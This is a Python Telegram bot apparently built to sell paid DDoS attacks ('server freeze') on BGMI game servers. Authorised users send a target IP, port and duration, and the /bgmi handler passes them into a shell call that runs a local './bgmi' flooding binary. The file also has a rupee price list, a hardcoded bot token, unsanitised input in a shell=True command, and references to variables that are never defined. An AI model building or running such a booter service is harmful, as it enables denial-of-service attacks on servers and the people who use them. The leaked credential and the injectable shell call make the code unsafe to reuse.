#!/usr/bin/python3
#@flash_hasan

import telebot
import subprocess
import requests
import datetime
import os

# insert your Telegram bot token here
bot = telebot.TeleBot('7439672972:AAF-7Hqlc1p_3oppHL2lKQ5SKiNTftJ1CbQ')

# Admin user IDs
admin_id = ["6483192993"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass


# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully."
            else:
                response = "User already exists."
        else:
            response = "Please specify a user ID to add."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} 𝐆𝐀𝐘𝐀 𝐁𝐒𝐃𝐊."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = '''Please Specify A User ID to Remove. 
 Usage: /remove <userid>'''
    else:
        response = "ＴＵ░ＭΛＴ░ＫＲＲ░ＢΛΛＰ░Ｋ♢░Ｂ♢Ｌ."

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully"
        except FileNotFoundError:
            response = "Logs are already cleared."
    else:
        response = "ＢＯＴ　ＫＥ　ＢＡＡＰ　ＫＯ　ＢＯＬ."
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found"
        except FileNotFoundError:
            response = "No data found"
    else:
        response = "ＢＯＴ　ＫＥ　ＢＡＡＰ　ＫＯ　ＢＯＬ."
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found."
                bot.reply_to(message, response)
        else:
            response = "No data found"
            bot.reply_to(message, response)
    else:
        response = "ＢＯＴ　ＫＥ　ＢＡＡＰ　ＫＯ　ＢＯＬ."
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 🚀𝙍𝙚𝙖𝙙𝙮 𝙩𝙤 𝙖𝙩𝙩𝙖𝙘𝙠🚀.\n\n:𝐓𝐚𝐫𝐠𝐞𝐭 {target}\n:𝐏𝐨𝐫𝐭:{port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\n@flash_hasan"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
                response = "𝐑𝐔𝐊 𝐍𝐀 𝐁𝐇𝐀𝐈 𝐈𝐓𝐍𝐈 𝐊𝐘𝐀 𝐉𝐀𝐋𝐃𝐈 𝐇𝐀𝐈."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 10000:
                response = "Error: 𝐊𝐀𝐌 𝐓𝐈𝐌𝐄 𝐃𝐀𝐋 𝐍𝐀 𝐈𝐒𝐒𝐄 𝐉𝐘𝐀𝐃𝐀 𝐂𝐇𝐀𝐈𝐘𝐄 𝐓𝐎 𝐏𝐀𝐈𝐃 𝐋𝐄 10000."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 5000"
                subprocess.run(full_command, shell=True)
                response = f"𝘽𝙂𝙈𝙄 𝘼𝙏𝙏𝘼𝘾𝙆 𝙆𝙃𝘼𝙏𝘼𝙈 𝙃𝙊 𝙂𝘼𝙔𝘼. 𝕋𝕒𝕣𝕘𝕖𝕥: {target} ℙ𝕠𝕣𝕥: {port} 𝕋𝕚𝕞𝕖: {time}"
        else:          response =         "🤖ƜƐŁㄈØ௱Ɛ🤖                                                                 🚀尺ƐΛÐϤ ŤØ ŁΛЦЛㄈн🚀                                                        🌹ЛɪҚ þ尺Ɛ௱ɪЦ௱ ϦØŤ🌹"
# Updated command syntax
    else:
        response = "𝐓𝐄𝐑𝐄 𝐒𝐄 𝐍𝐀𝐇𝐈 𝐇𝐎𝐆𝐀 𝐁𝐀𝐀𝐏 𝐊𝐎 𝐁𝐎𝐋.\n''@flash_hasan"

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "No Command Logs Found For You."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "𝐓𝐄𝐑𝐄 𝐒𝐄 𝐍𝐀𝐇𝐈 𝐇𝐎𝐆𝐀 𝐁𝐀𝐀𝐏 𝐊𝐎 𝐁𝐎𝐋."

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''▀▄▀▄▀▄ ᑕOᗰᗰᗩᑎᗪᔕ ▄▀▄▀▄▀:
 /bgmi : 𝚂𝙴𝚁𝚅𝙴𝚁 𝙵𝚁𝙴𝙴𝚉𝙴 𝙺𝙰𝚁𝙽𝙴 𝙺𝙴 𝙻𝙸𝚈𝙴. 
 /rules : 𝚄𝚂𝙴 𝙺𝙰𝚁𝙽𝙴 𝚂𝙴 𝙿𝙰𝙷𝙻𝙴 𝚈𝙴 𝙹𝙰𝚁𝚄𝚁 𝙳𝙴𝙺𝙷 𝙻𝙴𝙽𝙰 !!.
 /mylogs : 𝚃𝙴𝚁𝙴 𝙺𝙰𝙰𝚁𝙽𝙰𝙼𝙴 𝙳𝙴𝙺𝙷.
 /plan : 𝙿𝚊𝚒𝚍 𝚋𝚘𝚝 𝚔𝚒 𝚙𝚛𝚒𝚌𝚎.

 To See Admin Commands:
 /admincmd : Shows All Admin Commands.
 @flash_hasan
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"𝐀𝐀𝐏𝐊𝐀 𝐒𝐖𝐀𝐆𝐀𝐓 𝐇𝐀𝐈 𝐌𝐄𝐑𝐄 𝐁𝐎𝐓 𝐌𝐀𝐈𝐍, {user_name}! Feel Free to Explore.\n𝐁𝐎𝐓 𝐊𝐎 𝐂𝐇𝐀𝐋𝐀𝐍𝐄 𝐊𝐎 𝐍𝐀𝐇𝐈 𝐀𝐀𝐓𝐀 𝐓𝐎 : /help\n𝘿𝙐𝙉𝙄𝙔𝘼 𝙆𝘼 𝙎𝘼𝘽𝙎𝙀 𝙏𝘼𝙆𝘼𝙏𝙑𝘼𝙍 𝘽𝙊𝙏\n@flash_hasan"
    bot.reply_to(message, response)


@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} 𝐘𝐄 𝐑𝐔𝐋𝐄𝐒 𝐊𝐎 𝐅𝐎𝐋𝐋𝐎𝐖 𝐊𝐑:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
3. We Daily Checks The Logs So Follow these rules to avoid Ban!!
@flash_hasan'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝐁𝐇𝐀𝐈 𝐈𝐒𝐒𝐄 𝐒𝐀𝐒𝐓𝐀 𝐊𝐀𝐇𝐀 𝐍𝐀𝐇𝐈 𝐌𝐈𝐋𝐄𝐆𝐀 !!:

Vip :
-> Attack Time : 200 (S)
> After Attack Limit : 2 Min
-> Concurrents Attack : 300

Pr-ice List:
Day-->100 Rs
Week-->500 Rs
Month-->1600 Rs
@flash_hasan
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 𝐀𝐃𝐌𝐈𝐍 𝐊𝐄 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒!!:

/add <userId> : Add a User.
/remove <userid> Remove a User.
/allusers : Authorised Users Lists.
/logs : All Users Logs.
/broadcast : Broadcast a Message.
/clearlogs : Clear The Logs File.
@flash_hasan
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users."
        else:
            response = "Please Provide A Message To Broadcast."
    else:
        response = "ＢＯＴ　ＫＥ　ＢＡＡＰ　ＫＯ　ＢＯＬ."

    bot.reply_to(message, response)




bot.polling()
#@flash_hasan